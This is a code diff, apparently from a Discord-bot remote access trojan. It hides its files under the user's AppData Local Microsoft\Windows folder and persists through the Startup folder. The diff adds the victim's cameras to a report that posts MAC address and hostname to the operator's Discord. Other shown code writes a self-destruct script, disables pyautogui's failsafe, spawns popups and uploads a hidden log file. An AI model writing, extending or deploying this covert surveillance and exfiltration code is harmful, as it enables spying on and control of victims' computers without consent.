@@ -35,7 +35,7 @@ import socket as st1
 
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
 sys.stdout = open(os.path.join(target_path, "skibidi-main", "log.txt"), "a", buffering=1)  # "a" = append mode, "buffering=1" = line buffering
@@ -102,7 +102,7 @@ def get_device_ip():
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
 pyautogui.FAILSAFE = False
@@ -144,6 +144,8 @@ async def on_ready():
             des = f"""Mac address: {ip}
             Name: {st1.gethostname()}
 
+            Cameras: {cameras}
+
             Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}
 
             @everyone"""
@@ -164,7 +166,7 @@ async def on_ready():
 
         if existing_category:
             user_profile = os.environ['USERPROFILE']
-            target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+            target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
             if os.path.exists(os.path.join(target_path, "skibidi-main", "update.txt")):
 
                 with open(os.path.join(target_path, "skibidi-main", "update.txt")) as up:
@@ -302,7 +304,7 @@ import tempfile
 time.sleep(1)
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
 shutil.rmtree(os.path.join(target_path, "RemoteControl-startup"))
 shutil.rmtree(os.path.join(target_path, "skibidi-main"))
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
@@ -335,7 +337,7 @@ sys.exit()
 
         script_file = "self-destruct.pyw"
         user_profile = os.environ['USERPROFILE']
-        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
         if not os.path.exists(os.path.join(target_path, script_file)):
             with open(os.path.join(target_path, script_file), "w") as file:
                 file.write(script_content)
@@ -360,7 +362,7 @@ import tempfile
 time.sleep(1)
 
 user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
 shutil.rmtree(os.path.join(target_path, "RemoteControl-startup"))
 shutil.rmtree(os.path.join(target_path, "skibidi-main"))
 startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
@@ -393,7 +395,7 @@ sys.exit()
 
     script_file = "self-destruct.pyw"
     user_profile = os.environ['USERPROFILE']
-    target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+    target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
     if not os.path.exists(os.path.join(target_path, script_file)):
         with open(os.path.join(target_path, script_file), "w") as file:
             file.write(script_content)
@@ -463,7 +465,7 @@ async def popup(interaction : Interaction, message: str, window_title: Optional[
         fmsg = f"""X=MsgBox("{str(message)}",0+16,"{str(window_title)}")"""
 
         user_profile = os.environ['USERPROFILE']
-        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
 
         with open(os.path.join(target_path, "skibidi-main", "popup", "popup.vbs"), "w") as po:
             if repeat is None or repeat == 0:
@@ -482,7 +484,7 @@ async def output_log(interaction : Interaction):
     if str(category) == str(ip):
         await interaction.response.send_message("Sending log file...")
         user_profile = os.environ['USERPROFILE']
-        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+        target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
         log_path = os.path.join(target_path, "skibidi-main", "log.txt")
         file1 = nextcord.File(log_path, filename='log.txt')
         await interaction.send(file=file1)
